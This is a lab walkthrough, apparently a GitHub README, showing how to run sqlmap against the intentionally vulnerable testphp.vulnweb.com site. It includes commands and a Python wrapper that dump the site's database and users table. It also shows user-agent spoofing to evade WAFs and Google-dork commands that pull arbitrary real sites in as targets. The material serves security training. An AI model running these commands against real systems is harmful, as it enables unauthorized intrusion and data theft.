# Web Applications vulnerability Assessment with SQLMap

## Owerview



## LAB TOOLS 



## scop



## Introduction
### What is SQLMAP
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.


## Environment Setup:
### SQLMAP
- Installation on Kali Linux
````
sudo apt update
sudo apt install sqlmap -y
````
<img width="870" height="540" alt="image" src="https://github.com/user-attachments/assets/77da5ea2-11be-496f-9c06-003f5609189d" />


- Update sqlmap:
````
sudo sqlmap --update
````
<img width="914" height="350" alt="image" src="https://github.com/user-attachments/assets/ac7c8d03-2ca6-49d8-a3f4-46a119f4f251" />

- Check
````
sqlmap
````
<img width="918" height="226" alt="image" src="https://github.com/user-attachments/assets/93fa87b1-a94d-40cf-9a99-cefaabdd61da" />


### Target
-In this used `Vulnweb`:
<img width="992" height="351" alt="image" src="https://github.com/user-attachments/assets/eebfa303-32b1-400e-a200-d933f9c79194" />

- Go to this URL: http://testphp.vulnweb.com/
<img width="1010" height="712" alt="image" src="https://github.com/user-attachments/assets/b7307fc0-c14e-4408-9d7a-b7a076d48871" />





### SQLMAP Usage Options

| Category                    |                                Option(s) | What it does (plain English)                                                                                                                            | Example / Notes                                           |
| --------------------------- | ---------------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Verbosity                   |                             `-v VERBOSE` | Set verbosity level (0‚Äì6). Higher = more detailed output. Default is 1.                                                                                 | `-v 3` ‚Äî show more debugging info.                        |
| **Target**                  |              **(at least one required)** | **Define the target(s) to test**                                                                                                                        |                                                           |
|                             |                    `-u URL`, `--url=URL` | Target URL to test (single URL).                                                                                                                        | `-u "http://site/vuln.php?id=1"`                          |
|                             |                          `-g GOOGLEDORK` | Use Google dork results as target URLs.                                                                                                                 | `-g "inurl:php?id="`                                      |
| **Request**                 |           **How to send data / connect** |                                                                                                                                                         |                                                           |
|                             |                            `--data=DATA` | Send a POST data string (tests POST parameters).                                                                                                        | `--data="id=1&name=foo"`                                  |
|                             |                        `--cookie=COOKIE` | Provide an HTTP Cookie header value for requests.                                                                                                       | `--cookie="PHPSESSID=abc123; security=low"`               |
|                             |                         `--random-agent` | Use a randomly selected User-Agent header.                                                                                                              | Useful to avoid simple UA-based blocking.                 |
|                             |                          `--proxy=PROXY` | Route requests through a proxy (host:port).                                                                                                             | `--proxy="http://127.0.0.1:8080"`                         |
|                             |                                  `--tor` | Route traffic through the Tor network.                                                                                                                  | Requires Tor running locally.                             |
|                             |                            `--check-tor` | Verify that Tor is being used properly.                                                                                                                 | Run after `--tor`.                                        |
| **Injection**               | **Define parameters & payload behavior** |                                                                                                                                                         |                                                           |
|                             |                       `-p TESTPARAMETER` | Specify which parameter(s) to test (e.g., `id`, `name`).                                                                                                | `-p id` or `-p "id,name"`                                 |
|                             |                            `--dbms=DBMS` | Force/assume a particular DBMS type (e.g., `MySQL`, `MSSQL`).                                                                                           | `--dbms=MySQL` ‚Äî narrows tests to DB-specific techniques. |
| **Detection**               |  **Control detection depth / intensity** |                                                                                                                                                         |                                                           |
|                             |                          `--level=LEVEL` | Level of tests to perform (1‚Äì5). Higher = more tests. Default 1.                                                                                        | `--level=3` ‚Äî more thorough checks (slower).              |
|                             |                            `--risk=RISK` | Risk level of tests (1‚Äì3). Higher = riskier payloads. Default 1.                                                                                        | `--risk=2` ‚Äî allows tests that are somewhat intrusive.    |
| **Techniques**              |                     `--technique=TECH..` | Choose SQLi techniques to use. Default is `BEUSTQ`. Letters map to techniques (e.g., B=boolean, E=error, U=UNION, S=stacked, T=time, Q=inline queries). | `--technique=BE` ‚Äî only boolean & error-based tests.      |
| **Enumeration**             |          **Extract DB info / dump data** | `-a` retrieves everything; other flags target specific items.                                                                                           |                                                           |
|                             |                              `-a, --all` | Try to retrieve everything (banner, users, dbs, tables, data).                                                                                          | Very comprehensive ‚Äî usually slow.                        |
|                             |                           `-b, --banner` | Retrieve DBMS banner (version/info).                                                                                                                    | Quick info about DB engine/version.                       |
|                             |                         `--current-user` | Get DBMS current user.                                                                                                                                  | Shows the database user used by the app.                  |
|                             |                           `--current-db` | Get current database name.                                                                                                                              | Useful to focus further enumeration.                      |
|                             |                            `--passwords` | Enumerate DBMS user password hashes (if possible).                                                                                                      | High sensitivity ‚Äî careful in real tests.                 |
|                             |                                  `--dbs` | List available databases.                                                                                                                               | `--dbs` ‚Äî common first enumeration step.                  |
|                             |                               `--tables` | List tables (requires `-D DB` to specify database).                                                                                                     | `--tables -D users_db`                                    |
|                             |                              `--columns` | List columns in tables (requires `-D` and `-T`).                                                                                                        | `--columns -D shop -T products`                           |
|                             |                               `--schema` | Retrieve the DB schema.                                                                                                                                 | Higher-level view of DB structure.                        |
|                             |                                 `--dump` | Dump table entries (requires target DB/TBL/columns).                                                                                                    | `--dump -D shop -T users`                                 |
|                             |                             `--dump-all` | Dump entries for all DB tables.                                                                                                                         | Very noisy/slow ‚Äî use only in lab or with permission.     |
|                             |                                  `-D DB` | Specify DB name for enumeration.                                                                                                                        | `-D example_db`                                           |
|                             |                                 `-T TBL` | Specify table(s) to enumerate within `-D`.                                                                                                              | `-T users`                                                |
|                             |                                 `-C COL` | Specify column(s) to extract within `-T`.                                                                                                               | `-C "id,username,password"`                               |
| **Operating system access** | **Attempt OS-level access if DB allows** | These enable heavy, potentially destructive options ‚Äî require explicit permission and safe lab environments.                                            |                                                           |
|                             |                             `--os-shell` | Prompt for an interactive OS shell (if achievable).                                                                                                     | Very powerful; use only in isolated labs.                 |
|                             |                               `--os-pwn` | Try for OOB shell (Meterpreter/VNC) ‚Äî high-risk.                                                                                                        | Do **not** run against production systems.                |
| **General**                 |        **Session & automation controls** |                                                                                                                                                         |                                                           |
|                             |                                `--batch` | Run non-interactively: accept defaults (no prompts).                                                                                                    | Useful for scripts/automation.                            |
|                             |                        `--flush-session` | Clear saved session files for the current target.                                                                                                       | Use when changing testing parameters or starting fresh.   |
| **Miscellaneous**           |              **Helpers & beginner mode** |                                                                                                                                                         |                                                           |
|                             |                               `--wizard` | Interactive beginner-friendly wizard.                                                                                                                   | Guides you through common options step-by-step.           |



### Get help
````
sqlmap -hh
````
<img width="963" height="822" alt="image" src="https://github.com/user-attachments/assets/8dfb70c8-3d37-4ec5-96a3-22722d06b492" />

#### SQLMap Options (v1.9.9.4#dev) in Table Form
| **Category**     | **Option / Flag** | **Description**              |
| ---------------- | ----------------- | ---------------------------- |
| **General Help** | `-h`, `--help`    | Show basic help and exit     |
|                  | `-hh`             | Show advanced help and exit  |
|                  | `--version`       | Show sqlmap version and exit |
|                  | `-v <0-6>`        | Verbosity level (default 1)  |


#### Target Options
| **Option / Flag** | **Description**                                    |
| ----------------- | -------------------------------------------------- |
| `-u URL`          | Target URL (e.g., `http://site.com/vuln.php?id=1`) |
| `-d DIRECT`       | Direct DB connection string                        |
| `-l LOGFILE`      | Parse targets from Burp/WebScarab log file         |
| `-m BULKFILE`     | Scan multiple targets from file                    |
| `-r REQUESTFILE`  | Load raw HTTP request from file                    |
| `-g GOOGLEDORK`   | Use Google dork results as target URLs             |
| `-c CONFIGFILE`   | Load options from INI config file                  |



#### Request Options
| **Option / Flag**    | **Description**                          |
| -------------------- | ---------------------------------------- |
| `-A`, `--user-agent` | Set User-Agent header                    |
| `-H`, `--header`     | Extra header (e.g., `X-Forwarded-For`)   |
| `--method=METHOD`    | Force HTTP method (GET, POST, PUT, etc.) |
| `--data=DATA`        | POST data (e.g., `id=1`)                 |
| `--cookie=COOKIE`    | Cookie header (e.g., `PHPSESSID=...`)    |
| `--random-agent`     | Use random User-Agent                    |
| `--proxy=PROXY`      | Use a proxy server                       |
| `--tor`              | Use Tor for anonymity                    |
| `--timeout=TIMEOUT`  | Set connection timeout (default 30s)     |
| `--delay=SECONDS`    | Delay between requests                   |
| `--retries=NUM`      | Retry on timeout (default 3)             |
| `--safe-url`         | Visit a safe URL during testing          |
| `--csrf-token`       | Parameter holding anti-CSRF token        |
| `--csrf-url`         | URL to extract CSRF token                |
| `--ignore-code=CODE` | Ignore specific HTTP error codes         |
| `--ignore-redirects` | Ignore redirects                         |



#### Optimization
| **Option / Flag**   | **Description**                     |
| ------------------- | ----------------------------------- |
| `-o`                | Enable all optimizations            |
| `--threads=NUM`     | Number of concurrent requests       |
| `--keep-alive`      | Use persistent connections          |
| `--null-connection` | Retrieve page length only (no body) |



#### Injection Options
| **Option / Flag**      | **Description**                              |
| ---------------------- | -------------------------------------------- |
| `-p PARAM`             | Testable parameter(s)                        |
| `--skip=PARAM`         | Skip specific parameter(s)                   |
| `--param-filter=PLACE` | Select parameters by place (GET, POST, etc.) |
| `--dbms=DBMS`          | Force backend DBMS type                      |
| `--prefix=STRING`      | Payload prefix                               |
| `--suffix=STRING`      | Payload suffix                               |
| `--tamper=SCRIPT`      | Use tamper scripts                           |



#### Detection
| **Option / Flag**     | **Description**            |
| --------------------- | -------------------------- |
| `--level=1-5`         | Test intensity (default 1) |
| `--risk=1-3`          | Risk level (default 1)     |
| `--string=STRING`     | Match string if True       |
| `--not-string=STRING` | Match string if False      |
| `--regexp=REGEXP`     | Regex for True condition   |
| `--code=CODE`         | Match HTTP code if True    |



#### Techniques
| **Option / Flag**    | **Description**                           |
| -------------------- | ----------------------------------------- |
| `--technique=TECH`   | Choose SQLi techniques (B, E, U, S, T, Q) |
| `--time-sec=N`       | Delay for time-based tests                |
| `--union-cols=RANGE` | Test UNION column count                   |
| `--union-char=CHAR`  | Character for UNION bruteforce            |




#### Fingerprint
| **Option / Flag**     | **Description**               |
| --------------------- | ----------------------------- |
| `-f`, `--fingerprint` | Extensive DBMS fingerprinting |




#### Enumeration
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `-a`, `--all`     | Dump everything           |
| `-b`, `--banner`  | Get DBMS banner           |
| `--current-user`  | Get current DB user       |
| `--current-db`    | Get current DB name       |
| `--hostname`      | Get DB hostname           |
| `--is-dba`        | Check if user is DBA      |
| `--users`         | Enumerate DB users        |
| `--passwords`     | Dump user password hashes |
| `--dbs`           | List databases            |
| `--tables`        | List tables               |
| `--columns`       | List columns              |
| `--schema`        | Dump schema               |
| `--dump`          | Dump table entries        |
| `--dump-all`      | Dump all data             |
| `-D DB`           | Select database           |
| `-T TABLE`        | Select table              |
| `-C COLUMN`       | Select column             |



#### Brute Force
| **Option / Flag**  | **Description**      |
| ------------------ | -------------------- |
| `--common-tables`  | Check common tables  |
| `--common-columns` | Check common columns |
| `--common-files`   | Check common files   |



#### File System Access
| **Option / Flag**   | **Description**            |
| ------------------- | -------------------------- |
| `--file-read=FILE`  | Read file from server      |
| `--file-write=FILE` | Write local file to server |
| `--file-dest=PATH`  | Destination path on server |



#### OS Access
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `--os-cmd=CMD`    | Run OS command            |
| `--os-shell`      | Interactive OS shell      |
| `--os-pwn`        | OOB shell/Meterpreter/VNC |
| `--priv-esc`      | Try privilege escalation  |



#### Windows Registry
| **Option / Flag** | **Description**     |
| ----------------- | ------------------- |
| `--reg-read`      | Read registry key   |
| `--reg-add`       | Add registry key    |
| `--reg-del`       | Delete registry key |
| `--reg-key=KEY`   | Registry key path   |


#### General Options
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `-s FILE`         | Load session file         |
| `-t FILE`         | Log HTTP traffic to file  |
| `--batch`         | Never ask user input      |
| `--crawl=DEPTH`   | Crawl target site         |
| `--flush-session` | Clear session files       |
| `--forms`         | Parse and test HTML forms |
| `--update`        | Update sqlmap             |



#### Miscellaneous
| **Option / Flag** | **Description**                   |
| ----------------- | --------------------------------- |
| `-z MNEMONICS`    | Short mnemonics (e.g., `flu,bat`) |
| `--alert=CMD`     | Run OS command on finding SQLi    |
| `--beep`          | Beep when SQLi is found           |
| `--list-tampers`  | List tamper scripts               |
| `--wizard`        | Wizard interface for beginners    |




## Debugging and analysis modes

- Go to our target:
<img width="1021" height="801" alt="image" src="https://github.com/user-attachments/assets/1409279f-a4e0-45c7-a092-a48cd9beffb8" />

- Copy this parameter: http://testphp.vulnweb.com/artists.php?artist=2
<img width="1013" height="658" alt="image" src="https://github.com/user-attachments/assets/ecc722bd-5d12-4cbc-b23e-d3f56b433c06" />



### Verbose
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -vvvv
````
<img width="1704" height="759" alt="image" src="https://github.com/user-attachments/assets/72ec9087-0b42-479b-9fff-4973513593c6" />

<img width="676" height="658" alt="image" src="https://github.com/user-attachments/assets/fbee3474-b29d-4c3a-a3f0-98d4d77ced6c" />

- We also see `Payloads`
- Verbose options:
| LEVEL | OUTPUT DETAILS                                          |
|-------|--------------------------------------------------------|
| 0     | Show only Python tracebacks, error and critical messages. |
| 1     | Show also information and warning messages. (Default)  |
| 2     | Show also debug messages.                              |
| 3     | Show also payloads injected.                           |
| 4     | Show also HTTP requests.                               |
| 5     | Show also HTTP responses‚Äô headers.                     |
| 6     | Show also HTTP responses‚Äô page content.                |


````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -vvvvvvv
````
<img width="1717" height="818" alt="image" src="https://github.com/user-attachments/assets/fd9a93ed-2213-40af-991f-612911a07f5d" />

- We also see `Response`
<img width="992" height="781" alt="image" src="https://github.com/user-attachments/assets/6ad5ec00-88ff-4be2-9097-2545e5c19476" />

<img width="1272" height="715" alt="image" src="https://github.com/user-attachments/assets/6df04ec1-17c5-44b3-be32-b21ed4d7441f" />

- Remember SQLMAP take `-u` or `URL` with parameter.
- If we use it without `Parameter`
<img width="1673" height="416" alt="image" src="https://github.com/user-attachments/assets/c187ba9b-815a-43a4-b8c9-ca76c2c15ec9" />



### Direct
````
sqlmap -d "mysql://administrator:password@testphp.vulnweb.com:3306/test"
````
<img width="919" height="408" alt="image" src="https://github.com/user-attachments/assets/b20c7f3e-83fb-43a7-9bd3-1a9617b444c0" />

- This tells sqlmap to connect directly to a MySQL database using the provided connection string. It is not the same as scanning a web application for SQL injection ‚Äî -d gives sqlmap database credentials/connection info so it can talk to the DB server directly.
- But in this we Can't connect to MySQL server.
- `mysql://`  : DBMS dialect. Here it means MySQL (sqlmap will try to use a MySQL driver).
- `administrator`  : username used to authenticate to the DB.
- `password`  : password for that DB user. (If the password contains special characters, it must be URL-encoded.)
- `testphp.vulnweb.com`  :  hostname (or IP) of the DB server.
- `:3306` : port number (3306 is the default MySQL port).
- `/test` : database name to use/connect to (optional in many cases ‚Äî some tools still connect without specifying).

#### Install zapproxy
````
sudo apt install zaproxy
````
<img width="905" height="560" alt="image" src="https://github.com/user-attachments/assets/2f0e029e-c273-4f18-85b9-a190f9ebfdc0" />

````
zaproxy
````
<img width="922" height="732" alt="image" src="https://github.com/user-attachments/assets/57cf0243-b06d-4667-9db1-577696662959" />

<img width="790" height="592" alt="image" src="https://github.com/user-attachments/assets/100f2e17-e8d9-4892-a5f3-ca020a0334f2" />

- After go to browser:
<img width="918" height="676" alt="image" src="https://github.com/user-attachments/assets/3b8fd26c-bfcc-422e-8dd2-54efaf81c775" />

- Or we can go to direct link: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
<img width="906" height="467" alt="image" src="https://github.com/user-attachments/assets/1adb8127-5a0e-4588-8cdd-4df98b86380a" />

<img width="475" height="247" alt="image" src="https://github.com/user-attachments/assets/eac7752b-afd4-45c4-bec3-ebaa9847f0dc" />

<img width="517" height="283" alt="image" src="https://github.com/user-attachments/assets/eb80dc6f-4090-41f0-b713-2a11940a3703" />

- And we click on `Pin`


<img width="376" height="387" alt="image" src="https://github.com/user-attachments/assets/578a4149-e1e0-4b9e-a868-34e59112fd6f" />

<img width="491" height="137" alt="image" src="https://github.com/user-attachments/assets/e15b6658-4fcd-459d-8658-7b66f5e1168f" />

<img width="927" height="535" alt="image" src="https://github.com/user-attachments/assets/37f391c4-242c-46f8-9fc2-dda9078acd07" />

- After we click on `Save` we get a proxy:
<img width="298" height="327" alt="image" src="https://github.com/user-attachments/assets/17299fda-6f6e-4731-a274-044eba79ec4b" />

- To set with certificate go to new tab and type `about:config`: 
<img width="925" height="752" alt="image" src="https://github.com/user-attachments/assets/93bec53b-6662-48a4-85b5-d582b92f809f" />

<img width="927" height="341" alt="image" src="https://github.com/user-attachments/assets/8a140f2b-8104-4292-97d3-a221e49e2c62" />

<img width="930" height="640" alt="image" src="https://github.com/user-attachments/assets/d71f554b-cdda-4725-be8d-42fcec1cb32e" />

<img width="362" height="741" alt="image" src="https://github.com/user-attachments/assets/33a84aa6-4b9d-4d25-a12b-68df81cb9734" />

<img width="932" height="557" alt="image" src="https://github.com/user-attachments/assets/af40093a-cb6b-4202-835a-ffb69e38b7fb" />

- after go back to our `ZAP` 
<img width="920" height="624" alt="image" src="https://github.com/user-attachments/assets/196222e6-8b36-4ec8-a458-f7c879d02ee0" />

<img width="741" height="577" alt="image" src="https://github.com/user-attachments/assets/dbced223-7e0b-46fc-832e-5bb398ed395a" />

<img width="473" height="172" alt="image" src="https://github.com/user-attachments/assets/7d970bca-eb5d-4e61-8d97-53f7568dbd2d" />

<img width="738" height="580" alt="image" src="https://github.com/user-attachments/assets/1d71e8a9-09e6-4189-8a1f-b637281cc152" />

<img width="671" height="352" alt="image" src="https://github.com/user-attachments/assets/1e7d8765-9a42-4858-b80e-ba05a59b0771" />

<img width="672" height="322" alt="image" src="https://github.com/user-attachments/assets/2482bba3-7659-42e4-b7f0-fcc140c34fcd" />

<img width="665" height="458" alt="image" src="https://github.com/user-attachments/assets/8f29948a-3f21-4139-9b36-55972b8205c8" />

<img width="911" height="790" alt="image" src="https://github.com/user-attachments/assets/6b643217-9672-4a55-a444-87affa4e6a7e" />

<img width="783" height="305" alt="image" src="https://github.com/user-attachments/assets/9f66c4b3-9a04-4fc0-9460-46dad9b430bd" />

<img width="663" height="458" alt="image" src="https://github.com/user-attachments/assets/7281c35f-bc3b-4cc5-804c-d72cf850de9b" />

<img width="928" height="615" alt="image" src="https://github.com/user-attachments/assets/3f5148d3-a223-4ba0-8913-5340c5b565ab" />

- In our `ZAP` we see this:
<img width="923" height="677" alt="image" src="https://github.com/user-attachments/assets/fff9eead-e626-4163-87f2-cf52e96eefb5" />

- Double click on it:
<img width="1091" height="848" alt="image" src="https://github.com/user-attachments/assets/d307c9fd-8634-4430-b75c-c00e29375332" />

<img width="670" height="355" alt="image" src="https://github.com/user-attachments/assets/aa8a3297-1d71-4581-91e8-89f4f3b0ff50" />

- In our `File` we will see: 
<img width="870" height="683" alt="image" src="https://github.com/user-attachments/assets/ddecb993-c2a5-4d03-8442-897c4541908e" />

<img width="1672" height="866" alt="image" src="https://github.com/user-attachments/assets/642719ad-5123-4613-bab6-6652d2df6246" />

<img width="795" height="532" alt="image" src="https://github.com/user-attachments/assets/4a8c28e1-f50f-48cd-9b22-b89924ec8819" />

<img width="793" height="325" alt="image" src="https://github.com/user-attachments/assets/5e0e0f06-413c-4719-b213-24c6b2ddee0d" />

- We see this and press `Enter`:
````
sqlmap -l /home/k4n0ng/owasp.raw
Y
Y
Y
````
<img width="1701" height="829" alt="image" src="https://github.com/user-attachments/assets/d61d588e-bb5f-481b-8cfa-eac2aff72d3c" />

- -l: Load target(s) from a log file (owasp.raw) ‚Äî likely captured via Burp Suite or similar.

````
sqlmap -l /home/k4n0ng/owasp.raw --time-sec=10
````
<img width="1191" height="808" alt="image" src="https://github.com/user-attachments/assets/63f4c67a-fc60-4f3a-96c3-4f9c5a5cfab7" />

<img width="1776" height="737" alt="image" src="https://github.com/user-attachments/assets/59ecc795-8f53-4678-b506-63723021b941" />

- This command to give sqlmap more time to detect delays.
- Check:
````
cat /home/k4n0ng/.local/share/sqlmap/output/results-09302025_0956am.csv
````
<img width="657" height="96" alt="image" src="https://github.com/user-attachments/assets/d9860043-3e4f-4bd1-92f3-0e6d2b5a6c46" />


#### Exploit it:
##### Dump Database Names
````
sqlmap -l /home/k4n0ng/owasp.raw --dbs
````
<img width="1658" height="840" alt="image" src="https://github.com/user-attachments/assets/409080fe-747d-4b0a-a026-2157eb8b2339" />

#####  Dump Tables from acuart Database
````
sqlmap -l /home/k4n0ng/owasp.raw -D acuart --tables
````
<img width="1411" height="674" alt="image" src="https://github.com/user-attachments/assets/8d298e22-697d-41c8-b8e3-5c87aec0dc2a" />

<img width="1351" height="369" alt="image" src="https://github.com/user-attachments/assets/2f645c56-59f1-4aee-bea0-5fd217767493" />


##### Dump Specific Table (e.g., users)
````
sqlmap -l /home/k4n0ng/owasp.raw -D acuart -T users --dump
````
<img width="1418" height="679" alt="image" src="https://github.com/user-attachments/assets/04ec28d6-e3e8-4b99-a9c0-3fdcc29ce165" />

<img width="1206" height="733" alt="image" src="https://github.com/user-attachments/assets/6f4aece1-74e6-4c3d-bfbf-9b4d0ebf45b9" />

---
###  Python Script That Runs sqlmap via Subprocess
````
mousepad exploit_acuart.py
````
````
import subprocess
import sys

def run_sqlmap(target_url, options=None):
    """
    Run sqlmap with given URL and optional flags
    """
    cmd = ["sqlmap", "-u", target_url, "--batch"]
    
    if options:
        cmd.extend(options)
    
    print(f"[+] Running: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print("[!] Errors:", result.stderr[:500])  # Show first 500 chars
    except FileNotFoundError:
        print("[-] Error: sqlmap not found. Install it first!")
        sys.exit(1)

if __name__ == "__main__":
    # Target: Acunetix acuart (live or local)
    TARGET = "http://testphp.vulnweb.com/artists.php?artist=1"


    print("[*] Starting SQLi exploitation on Acunetix acuart...")
    
    # Step 1: Check if injectable
    run_sqlmap(TARGET, ["--dbs"])
    
    # Step 2: Dump users table
    run_sqlmap(TARGET, ["-D", "acuart", "-T", "users", "--dump"])
    
    print("[*] Done!")
````
<img width="1659" height="718" alt="image" src="https://github.com/user-attachments/assets/042434ef-1185-4204-b1ca-1ceb0b06c6f3" />

````
python exploit_acuart.py
````
<img width="1417" height="774" alt="image" src="https://github.com/user-attachments/assets/f2b0fb8b-64ab-4775-ad75-9deb34bc8df2" />

<img width="1419" height="789" alt="image" src="https://github.com/user-attachments/assets/af5d1f40-174a-4fcf-8932-4cfdbe675655" />

<img width="913" height="718" alt="image" src="https://github.com/user-attachments/assets/4e8f2b8d-e931-46df-8c4f-311c7fceafe4" />

<img width="1145" height="760" alt="image" src="https://github.com/user-attachments/assets/24c31a9e-3cee-4413-ac4f-53702ccde3c8" />

- It will brute forcing Usename and password until correct.



---

- Open our browser again:
- Type this again: http://testphp.vulnweb.com/ , and after right click on `Browser categories` and click `Open link`: 
<img width="873" height="733" alt="image" src="https://github.com/user-attachments/assets/27a4e48b-6bd9-4adf-b289-b090f2fc698b" />

<img width="698" height="704" alt="image" src="https://github.com/user-attachments/assets/3a47a60c-8887-404b-829c-1080743deb2f" />

- Right click on `Posters` -> `Paintings` -> `Stickers` -> `Graffity`,  Right click on all of it we will see this:
<img width="1446" height="706" alt="image" src="https://github.com/user-attachments/assets/ba6d86e7-25ae-4a29-8774-cbe10da44afc" />

<img width="1457" height="896" alt="image" src="https://github.com/user-attachments/assets/bdce1c8a-643b-4c64-85b0-151656b96bdd" />

- Lets create file of all URL:
Right click on it
<img width="572" height="431" alt="image" src="https://github.com/user-attachments/assets/9799a138-4792-4681-81ec-371512dee0f4" />

<img width="303" height="153" alt="image" src="https://github.com/user-attachments/assets/e475c787-f014-44de-8261-482aaeae6f80" />

<img width="1681" height="589" alt="image" src="https://github.com/user-attachments/assets/3b7021f9-f2cc-4288-b381-db91500764f1" />

- Pass all our URL to our file `bulk.txt`:


- In terminal pass our file `bulk.txt`
````
sqlmap -m '/home/k4n0ng/Desktop/bulk.txt' --dbs
````
<img width="1451" height="816" alt="image" src="https://github.com/user-attachments/assets/4ec506f6-a0cd-4bf2-8f99-7795ecb54f5e" />

<img width="1899" height="783" alt="image" src="https://github.com/user-attachments/assets/30945657-1c51-42e8-b4cc-b1ab19b2ec5f" />

- Go to difference parameter:
<img width="1158" height="893" alt="image" src="https://github.com/user-attachments/assets/8c407398-5498-4ae0-a57f-4322dc36f295" />

- After this we will see this:
<img width="1166" height="693" alt="image" src="https://github.com/user-attachments/assets/5c318256-fbd8-4927-8e38-326c22eb09f3" />

<img width="928" height="716" alt="image" src="https://github.com/user-attachments/assets/5300afc2-8d5c-42fc-8716-cb8e555ecc3a" />

<img width="931" height="672" alt="image" src="https://github.com/user-attachments/assets/776fa301-790a-474c-973d-e11c6f58c16d" />

- Copy this: http://testphp.vulnweb.com/artists.php?artist=1
<img width="930" height="800" alt="image" src="https://github.com/user-attachments/assets/396705ea-69f1-44ad-a22e-61525f16e399" />

- Delete all of this:
<img width="844" height="543" alt="image" src="https://github.com/user-attachments/assets/d0df46db-6551-4ccf-8790-798807f5c26c" />

- And past this to our file `bulk.txt`
<img width="839" height="491" alt="image" src="https://github.com/user-attachments/assets/70179a95-0ab3-4295-8a49-590e81770426" />

- In this we have difference parameter.

- Type this to `Search art` and click `go`:
<img width="923" height="645" alt="image" src="https://github.com/user-attachments/assets/82c4e19c-b704-4963-953f-ec90f8fa997b" />

- We will see this:
<img width="938" height="597" alt="image" src="https://github.com/user-attachments/assets/904b6d42-d65a-460e-a579-b071a23aaf2e" />

- Copy this link:
<img width="891" height="671" alt="image" src="https://github.com/user-attachments/assets/42cbb215-8361-46bf-8258-6bcba9455c4c" />

- And past to our file `bulk.txt` after past link click `Save`:
<img width="852" height="326" alt="image" src="https://github.com/user-attachments/assets/9f5088c2-f51f-4ec3-9555-1f6f2dffb62b" />

- And type command again:
````
sqlmap -m '/home/k4n0ng/Desktop/bulk.txt' --dbs
````
<img width="1721" height="463" alt="image" src="https://github.com/user-attachments/assets/d3251dad-e296-491b-9761-72f2299f537d" />

<img width="1717" height="719" alt="image" src="https://github.com/user-attachments/assets/0033c178-4047-42e1-b6a9-66b5dcec48be" />

- In this we see 3 target.
<img width="923" height="675" alt="image" src="https://github.com/user-attachments/assets/306743b7-9adc-4582-9684-054074faacb6" />

<img width="1901" height="862" alt="image" src="https://github.com/user-attachments/assets/54393bdf-16f3-4420-baed-4aa7450891d7" />

<img width="675" height="356" alt="image" src="https://github.com/user-attachments/assets/47ba266f-e314-49ee-aed9-50dbff64d5d7" />

<img width="528" height="498" alt="image" src="https://github.com/user-attachments/assets/2cde8358-4d05-4867-be30-6f3e58fcdd98" />

- In this we see our `request.raw` and open it also choose `Mousepad`:
<img width="533" height="466" alt="image" src="https://github.com/user-attachments/assets/44730c93-ac40-451a-8467-a1377a5d6d84" />

- we will see it the same `URL`:
<img width="1815" height="725" alt="image" src="https://github.com/user-attachments/assets/ec12feaa-7771-4f20-a44d-54ac3ad9455b" />

````
sqlmap -r '/home/k4n0ng/Desktop/request.raw' --dbs
````
<img width="909" height="812" alt="image" src="https://github.com/user-attachments/assets/19925c37-1810-499c-b14d-3d0fce42ee3e" />

<img width="911" height="812" alt="image" src="https://github.com/user-attachments/assets/d91b3155-1886-432a-bef5-7b782703bac1" />

<img width="969" height="807" alt="image" src="https://github.com/user-attachments/assets/631f6ebc-861c-46fa-a7a2-34a2c16c1275" />

- In this we found the vulnerability.
---


###  GOOGLEDORK
````
sqlmap -g "inurl:php?id="
````
<img width="1725" height="820" alt="image" src="https://github.com/user-attachments/assets/a623b382-2dbb-454f-b0cc-4b149a8b4f97" />

<img width="1903" height="754" alt="image" src="https://github.com/user-attachments/assets/46201394-1704-425f-a7dd-28cdf15df26e" />

````
sqlmap -g "inurl:listproducts.php?cat="
````
<img width="907" height="775" alt="image" src="https://github.com/user-attachments/assets/297be637-4cf6-4ed1-958c-4f977d49e909" />



### Request
#### Agent
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -A 'Mozilla/4.2' -v5
````
<img width="906" height="570" alt="image" src="https://github.com/user-attachments/assets/ff86afab-390d-4d8c-be4f-014fc9a55ff9" />

<img width="1584" height="781" alt="image" src="https://github.com/user-attachments/assets/35f3df06-aa78-494d-9726-983bf291dc85" />

- In this it give `User-Agent: Mozilla/4.2`

- But if run command this:
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -v5
````
<img width="909" height="565" alt="image" src="https://github.com/user-attachments/assets/37de3af2-f7e5-4074-b3c2-48c988a571fb" />

- In this it show `sqlmap/1.9.9.4`
- User Agent like this:
<img width="1918" height="862" alt="image" src="https://github.com/user-attachments/assets/901bd053-ac4d-4ea2-8e80-236f50e22769" />

- Or to make it even more realistic:
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
````
<img width="1681" height="708" alt="image" src="https://github.com/user-attachments/assets/2f685715-9a6c-4b1e-8158-2b6cd80b25ff" />

-  This helps bypass filters that block `unknown` or `automated‚Äù` tools. 

#### SQLMAP REQUEST OPTIONS

````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --random-agent -v5
````
<img width="1877" height="612" alt="image" src="https://github.com/user-attachments/assets/e4594ac8-4a63-4fc3-af3b-dbbe409b024e" />

<img width="1569" height="786" alt="image" src="https://github.com/user-attachments/assets/b196ee92-d735-4cb2-a06d-b5c79b4817d1" />

- `--random-agent -v5` : hen a request is sent to a web server, the browser includes a User-Agent header that identifies the browser and operating system. This header can be flagged by Web Application Firewalls (WAFs) or Intrusion Detection Systems (IDS).
SQLMAP allows you to manually set a custom User-Agent using the -A option.
